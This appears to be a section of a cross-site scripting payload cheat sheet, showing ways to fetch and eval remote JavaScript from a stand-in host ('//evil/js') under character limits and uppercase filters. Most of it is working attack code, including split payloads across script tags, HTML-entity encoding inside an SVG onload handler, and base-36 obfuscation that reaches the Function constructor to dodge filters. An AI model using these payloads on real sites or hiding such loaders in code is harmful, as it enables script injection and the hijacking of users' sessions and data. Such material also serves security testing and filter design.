### Fetch an external resource ###

Brief summary of the work of [@aurainfosec](https://github.com/aurainfosec).

For example purposes the malicious JavaScript is at `//evil/js`.

The payload:
```
fetch('//evil/js').then(r=>r.text().then(eval))
```

**Usecase: character limit is &gt;= 20 (not including wrapping). Dealing with limited space**
```
T=(o,f)=>o.then(f)
X=eval
Y='//evil/js'
Z=r=>T(r.text(),X)
J=_=>T(fetch(Y),Z)
setTimeout(_=>J(),9)
```

**Usecase: character limit is &gt;= 13 (not including wrapping). Payloads order on page __does__ matter.**
```
p=Promise
P=p.prototype
t=P.then
tc=t.call
T=tc.bind(t)
r=Response
R=r.prototype
z=R.text
zc=z.call
Z=zc.bind(z)
E=eval
j='//evil/js'
J=fetch(j)
T(T(J,Z),E)
```

### Usecase: character limit is &gt;= 10
* *Works with arbitrary payloads*
* *No additional wrapping needed*
* *`<script>` must not be blocked and must not appear between the payloads*
* *Payloads order on page __does__ matter.*

```
<script>/*
*/X="f"+/*
*/"etc"+/*
*/"h('"+/*
*/"//e"+/*
*/"vil"+/*
*/"/js"+/*
*/"')."+/*
*/"the"+/*
*/"n(r"+/*
*/"=>r"+/*
*/".te"+/*
*/"xt("+/*
*/").t"+/*
*/"hen"+/*
*/"(ev"+/*
*/"al)"+/*
*/"))"/*
*/;eval/*
*/(X);
</script>
```
### Dealing with input transformation

##### Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)
* *Works with arbitrary payloads*
* `<script>`**_payload_**`</script>` won't work; use event handlers

```
X="FETCH(\"//EVIL/JS\").THEN(R=>R.TEXT().THEN(EVAL))";&#X65;&#X76;&#X61;&#X6C;(X.&#X74;&#X6F;L&#X6F;&#X77;&#X65;&#X72;C&#X61;&#X73;&#X65;())
```

**Explanation:** The second part of the payload is `eval(X.toLowerCase())`.

**Note:** `<script>` doesn't work here, because the HTML characters won't be interpreted. Payload must be in an event handler. For example:

```
<SVG/ONLOAD='X="FETCH(\"//EVIL/JS\").THEN(R=>R.TEXT().THEN(EVAL))";&#X65;&#X76;&#X61;&#X6C;(X.&#X74;&#X6F;L&#X6F;&#X77;&#X65;&#X72;C&#X61;&#X73;&#X65;())'/>
```

##### Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)
* *Works with arbitrary payloads*
* X can be any function that doesn't involve lowercase letters. Some examples are:
  * `URL` and `$`: don't work inside event handlers
  * `USB` and `CSS`: don't have good cross-browser support
  * `[][F[0]+(1/0+[])[3]+F[2]+F[2]]` used below, where `F` is "false", gives `[]["fill"]`, i.e. `Array.prototype.fill`: works in all browsers and in all places

```
T=!0+[];F=!1+[];X=[][F[0]+(1/0+[])[3]+F[2]+F[2]];Y=X+[];S=F[3]+F[2]+Y[5]+Y[3]+F[4];C=Y[3]+Y[S](6,8)+F[3]+T[S](0,3)+Y[S](3,5)+Y[6]+T[1];N=C[S](8,10)+(""[C]+[])[S](9,15);(X[C](25885457[N](36)+"('//"+694029[N](36)+"/"+712[N](36)+"')."+1375583[N](36)+"("+27[N](36)+"=>"+27[N](36)+"."+1372385[N](36)+"()."+1375583[N](36)+"("+693741[N](36)+"))"))()
```

**With comments:**

```
T=!0+[]; // "true"
F=!1+[]; // "false"
// I=1/0+[]; // "Infinity"
X=[][F[0]+(1/0+[])[3]+F[2]+F[2]]; // []["fill"], i.e.
                                  // Array.prototype.fill
Y=X+[]; // "function ...", to get letters "c" and "o"
S=F[3]+F[2]+Y[5]+Y[3]+F[4]; // S="slice"
C=Y[3]+Y[S](6,8)+F[3]+T[S](0,3)+Y[S](3,5)+Y[6]+T[1];
                                  // C="constructor"
N=C[S](8,10)+(""[C]+[])[S](9,15); // N="toString";
                                  // <number>["toString"](36)
                                  // can give any number or
                                  // lowercase letter as string
J=25885457[N](36) // "fetch"
+"('//"
+694029[N](36) // "evil"
+"/"
+712[N](36) // "js"
+"')."
+1375583[N](36) // "then"
+"("
+27[N](36) // "r"
+"=>"
+27[N](36) // "r"
+"."
+1372385[N](36) // "text"
+"()."
+1375583[N](36) // "then"
+"("
+693741[N](36) // "eval"
+"))";
(X[C](J))(); // X[C] is Array.prototype.fill["constructor"],
             // i.e. Function.prototype. It creates an
             // anonymous function with J as the body, which
             // is then executed
```
**PLUS**
```
<SCRIPT>/*
*/T=!0/*
*/+[];/*
*/F=!1/*
*/+[];/*
*/I=1/0/*
*/+[];/*
*/X=/*
*/F[0]+/*
*/I[3]+/*
*/F[2]+/*
*/F[2];/*
*/X=[]/*
*/[X];/*
*/Y=/*
*/X+[];/*
*/C=/*
*/Y[3]+/*
*/Y[6]+/*
*/Y[7]+/*
*/F[3]+/*
*/T[0]+/*
*/T[1]+/*
*/T[2]+/*
*/Y[3]+/*
*/Y[4]+/*
*/Y[6]+/*
*/T[1];/*
*/S=""/*
*/[C]/*
*/+[];/*
*/N=/*
*/C[8]+/*
*/C[9]+/*
*/S[9]+/*
*/S[10]+/*
*/S[11]+/*
*/S[12]+/*
*/S[13]+/*
*/S[14];/*
*/Q=/*
*/X[C];/*
*/R=A=>/*
*/Q(A);/*
*/O=A=>/*
*/A[N]/*
*/(36);/*
*/V=2588/*
*/*10000/*
*/+5457/*
*/J=O(V)/*
*/J+=/*
*/"('//"/*
*/V=/*
*/694029/*
*/J+=/*
*/O(V);/*
*/J+=/*
*/"/";/*
*/J+=/*
*/O(712)/*
*/J+=/*
*/"')."/*
*/W=1375/*
*/*1000/*
*/+583/*
*/J+=/*
*/O(W)/*
*/J+=/*
*/"("/*
*/J+=/*
*/O(27)/*
*/J+=/*
*/"=>"/*
*/J+=/*
*/O(27)/*
*/J+=/*
*/"."/*
*/V=W-/*
*/3198/*
*/J+=/*
*/O(V)/*
*/J+=/*
*/"()."/*
*/J+=/*
*/O(W)/*
*/J+=/*
*/"("/*
*/V=/*
*/693741/*
*/J+=/*
*/O(V)/*
*/J+=/*
*/"))";(/*
*/R(J))/*
*/();
</SCRIPT>
```
